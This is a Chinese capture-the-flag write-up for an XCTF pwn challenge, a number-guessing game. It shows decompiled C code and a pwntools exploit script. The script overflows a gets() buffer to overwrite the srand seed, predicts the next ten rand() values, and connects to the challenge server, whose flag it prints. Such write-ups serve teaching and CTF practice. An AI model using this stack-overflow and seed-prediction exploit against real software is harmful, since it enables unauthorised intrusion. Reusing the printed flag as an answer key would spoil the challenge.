https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5057&page=1

# 分析

1. checksec

       Arch:     amd64-64-little
       RELRO:    Partial RELRO
       Stack:    Canary found
       NX:       NX enabled
       PIE:      PIE enabled

2. IDA

   ```c
   __int64 __fastcall main(__int64 a1, char **a2, char **a3)
   {
     int v4; // [rsp+4h] [rbp-3Ch]
     int i; // [rsp+8h] [rbp-38h]
     int v6; // [rsp+Ch] [rbp-34h]
     char v7; // [rsp+10h] [rbp-30h]
     unsigned int seed[2]; // [rsp+30h] [rbp-10h]
     unsigned __int64 v9; // [rsp+38h] [rbp-8h]
   
     v9 = __readfsqword(0x28u);
     setbuf(stdin, 0LL);
     setbuf(stdout, 0LL);
     setbuf(stderr, 0LL);
     v4 = 0;
     v6 = 0;
     *(_QWORD *)seed = sub_BB0();
     puts("-------------------------------");
     puts("Welcome to a guess number game!");
     puts("-------------------------------");
     puts("Please let me know your name!");
     printf("Your name:", 0LL);
     gets((__int64)&v7);
     srand(seed[0]);
     for ( i = 0; i <= 9; ++i )
     {
       v6 = rand() % 6 + 1;
       printf("-------------Turn:%d-------------\n", (unsigned int)(i + 1));
       printf("Please input your guess number:");
       __isoc99_scanf("%d", &v4);
       puts("---------------------------------");
       if ( v4 != v6 )
       {
         puts("GG!");
         exit(1);
       }
       puts("Success!");
     }
     sub_C3E();
     return 0LL;
   }
   ```

   ```c
   __int64 sub_C3E()
   {
     printf("You are a prophet!\nHere is your flag!");
     system("cat flag");
     return 0LL;
   }
   ```

   猜对10次数字就可以得到flag，利用random() 是伪随机的特性，即可推知它的结果。

   参数v7和seed差0x20个字符，可利用栈溢出覆盖seed。

   3. pwntools

      ```python
      from pwn import *
      from ctypes import * 
      
      context.log_level = "debug"
      context.arch = "amd64"
      
      sh = remote('111.200.241.244', 54025)
      
      libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
      
      payload = b'a' * 0x20 + p64(1)
      
      sh.recvuntil("Your name:")
      sh.sendline(payload)
      
      libc.srand(1)
      for i in range(10):
      	sh.recvuntil("Please input your guess number:")
      	sh.sendline(str(libc.rand()%6 + 1))
      sh.interactive()
      ```

      得到flag：cyberpeace{0351dc105c58a1aef36c3830b8d229fb}

